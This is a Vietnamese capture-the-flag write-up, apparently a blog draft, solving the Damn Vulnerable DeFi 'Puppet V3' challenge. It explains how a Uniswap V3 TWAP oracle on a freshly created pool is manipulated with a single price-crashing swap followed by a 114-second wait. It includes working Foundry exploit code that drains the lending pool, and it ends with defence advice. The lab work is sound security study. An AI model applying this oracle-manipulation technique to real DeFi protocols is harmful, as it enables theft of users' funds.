---
title: "[DVD-10] Puppet V3: TWAP Uniswap V3 cũng có thể bị thao túng khi pool mới ra đời"
description: "PuppetV3Pool dùng TWAP 10 phút của Uniswap V3 làm oracle — vẫn bị bẻ khóa. Pool vừa được tạo, chỉ có một observation 3 ngày tuổi; cú swap đầu tiên đẩy giá xuống đáy, và OracleLibrary.consult ngoại suy endpoint hiện tại theo tick đang sập, nên chỉ sau ~114 giây TWAP đã phản ánh giá bị thao túng."
pubDate: 2026-08-26
tags: ["web3", "ctf", "smart-contract", "damn-vulnerable-defi", "oracle-manipulation"]
draft: true
challenge: "damn-vulnerable-defi"
difficulty: "medium"
series: "damn-vulnerable-defi"
---

## Tóm tắt

Puppet V3 là phiên bản "đã sửa" của chuỗi oracle: thay vì spot price, pool dùng **TWAP 10 phút** của Uniswap V3 qua `OracleLibrary.consult`. Nhưng pool trong challenge vừa được tạo và chỉ có duy nhất một observation 3 ngày tuổi ở giá 1:1. Cú swap đầu tiên (cũng là swap duy nhất) đẩy giá xuống tick tối thiểu, và cơ chế ngoại suy (extrapolation) của Uniswap Oracle khiến cửa sổ 10 phút nhanh chóng bị tick đã sập chi phối — chỉ cần đợi 114 giây là TWAP "bình thường hóa" theo giá bị thao túng. Challenge giới hạn toàn bộ kịch bản trong 115 giây, vừa khít.

## Bối cảnh & Mục tiêu

- **PuppetV3Pool** (`src/puppet-v3/PuppetV3Pool.sol`) — lending pool vay DVT, nộp WETH, `DEPOSIT_FACTOR = 3`, dùng `OracleLibrary.consult(pool, TWAP_PERIOD)` với `TWAP_PERIOD = 10 minutes` (dòng 15–16, 56–69).
- Challenge chạy trên **fork mainnet tại block 15450164** (test/puppet-v3/PuppetV3.t.sol:46-48) để tận dụng các contract Uniswap v3 thật (factory `0x1F98…`, PositionManager `0xC364…`, WETH `0xC02a…`), nhưng DVT là token mới triển khai trong test.

Trạng thái ban đầu: deployer tạo pool DVT/WETH fee 3000 với giá khởi tạo 1:1, range tick −60..60, đổ vào 100 WETH + 100 DVT, rồi `skip(3 days)` — pool nằm yên 3 ngày, **chưa từng có swap nào**. Player có 110 DVT + 1 ETH; pool nắm 1.000.000 DVT.

Điều kiện thắng (`_isSolved()`, dòng 163–167): toàn bộ diễn biến phải xong trong **dưới 115 giây** kể từ `initialBlockTimestamp`, pool hết DVT, recovery nhận đủ 1.000.000 DVT.

## Phân tích lỗ hổng

Cách pool lấy giá (`src/puppet-v3/PuppetV3Pool.sol:61-69`):

```solidity
function _getOracleQuote(uint128 amount) private view returns (uint256) {
    (int24 arithmeticMeanTick,) = OracleLibrary.consult({pool: address(uniswapV3Pool), secondsAgo: TWAP_PERIOD});
    return OracleLibrary.getQuoteAtTick({
        tick: arithmeticMeanTick,
        baseAmount: amount,
        baseToken: address(token),
        quoteToken: address(weth)
    });
}
```

`OracleLibrary.consult(secondsAgo = 600)` gọi `pool.observe([600, 0])` rồi lấy trung bình tick theo thời gian trong 600 giây. Uniswap v3 Oracle chỉ lưu các observation tại những thời điểm có giao dịch/thay đổi thanh khoản; khi query rơi vào khoảng không có observation, nó **nội suy** giữa hai observation gần nhất, còn khi query vượt qua observation mới nhất thì **ngoại suy bằng tick hiện tại** (current tick).

Khai thác điểm yếu nằm ở chính trạng thái "pool mới":

1. Observation duy nhất trước swap là từ lúc mint, 3 ngày trước, tick = 0 (giá 1:1).
2. Cú swap dump 110 DVT làm tick hiện tại lao từ 0 xuống **−887272** (tick tối thiểu, toàn bộ thanh khoản bị tiêu thụ hết).
3. Ngay sau swap (cùng block), query TWAP vẫn ra tick ≈ 0: endpoint "600 giây trước" và "hiện tại" đều nội suy trên khoảng trống 3 ngày với observation cũ, nên giá trung bình chưa kịp phản ánh cú sập. (Kiểm chứng thực nghiệm: ngay sau swap, `arithmeticMeanTick == 0`.)
4. Nhưng Uniswap Oracle **ngoại suy endpoint hiện tại theo tick đang sống** (đã là −887272). Sau khi trôi thêm `t` giây, tick trung bình 600 giây xấp xỉ `−887272 × t / 600`. Chỉ cần `t ≈ 114s` là tick trung bình rơi xuống khoảng −168.000, tương ứng giá DVT ≈ 4,8e-8 WETH — đủ để collateral của 1.000.000 DVT tụt xuống dưới 0,15 WETH.

TWAP 10 phút vốn được coi là "chống thao túng" vì cần duy trì giá sai trong thời gian dài — nhưng ở đây attacker không cần duy trì gì cả: giá sai được "tự động ghi nhận" nhờ ngoại suy, chỉ cần chờ đúng số giây cần thiết.

## Khai thác

`test_puppetV3()` (test/puppet-v3/PuppetV3.t.sol:125-158) — dùng SwapRouter mainnet `0xE592…`:

```solidity
// 1) Dump toàn bộ 110 DVT vào pool qua một swap
token.approve(address(swapRouter), PLAYER_INITIAL_TOKEN_BALANCE);
swapRouter.exactInputSingle(ISwapRouter.ExactInputSingleParams({
    tokenIn: address(token),
    tokenOut: address(weth),
    fee: FEE,
    recipient: player,
    deadline: block.timestamp,
    amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
    amountOutMinimum: 0,
    sqrtPriceLimitX96: 0
}));

// 2) Chờ TWAP "ngấm" tick đã sập — giới hạn cứng là 115 giây
vm.warp(block.timestamp + 114);

// 3) Wrap ETH, vay toàn bộ pool với collateral siêu rẻ
weth.deposit{value: player.balance}();
uint256 required = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
weth.approve(address(lendingPool), required);
lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);

// 4) Gửi token trộm được về recovery
token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
```

Sau swap, player nhận về ~99,85 WETH (cộng 1 ETH wrap được ≈ 100,85 WETH). Collateral cần nộp chỉ ~0,15 WETH — dư sức. Bước `vm.warp(+114)` là điểm sống còn: bỏ qua nó, TWAP vẫn ≈ 0 và khoản nộp yêu cầu là 3.000.000 WETH, borrow sẽ revert.

## Kết quả

Challenge cần RPC archive mainnet (fork block 15450164). Chạy với `MAINNET_FORKING_URL` trỏ tới RPC archive (ở đây dùng `eth-mainnet.public.blastapi.io`):

```
$ MAINNET_FORKING_URL=https://eth-mainnet.public.blastapi.io forge test --match-path test/puppet-v3/PuppetV3.t.sol --match-test test_puppetV3 -vv
Ran 1 test for test/puppet-v3/PuppetV3.t.sol:PuppetV3Challenge
[PASS] test_puppetV3() (gas: 745575)
Suite result: ok. 1 passed; 0 failed; 0 skipped
```

Cả suite (kèm `test_assertInitialState`) đều PASS trên fork thật.

## Bài học & Cách phòng tránh

- **TWAP không tự động an toàn.** Độ an toàn của TWAP phụ thuộc vào: độ dài cửa sổ so với khả năng chi phối giá của attacker, tuổi và mật độ observation của pool, và độ sâu thanh khoản. Một pool mới chỉ có vài observation là "TWAP suy biến" — gần như spot price.
- **Cửa sổ TWAP phải đủ dài so với thời gian attacker có thể duy trì giá sai.** Ở challenge này cửa sổ 10 phút vẫn quá ngắn; trong thực tế các pool dùng TWAP 30 phút–24 giờ và vẫn bị tấn công khi thanh khoản mỏng.
- **Kiểm tra độ tuổi/mật độ observation và độ sâu thanh khoản trước khi tin giá:** từ chối nếu pool mới tạo, số observation ít, hoặc reserve quá nhỏ so với khoản vay. Kết hợp nhiều nguồn giá (Chainlink, TWAP, giá sàn DEX) và cơ chế cảnh báo lệch giá.

## Tham khảo

- Challenge: [Puppet V3 — Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/challenges/puppet-v3)
- Source: `src/puppet-v3/PuppetV3Pool.sol`, `test/puppet-v3/PuppetV3.t.sol`
- Uniswap v3 Oracle: [Oracle.sol](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/Oracle.sol), [OracleLibrary.sol](https://github.com/Uniswap/v3-periphery/blob/main/contracts/libraries/OracleLibrary.sol)
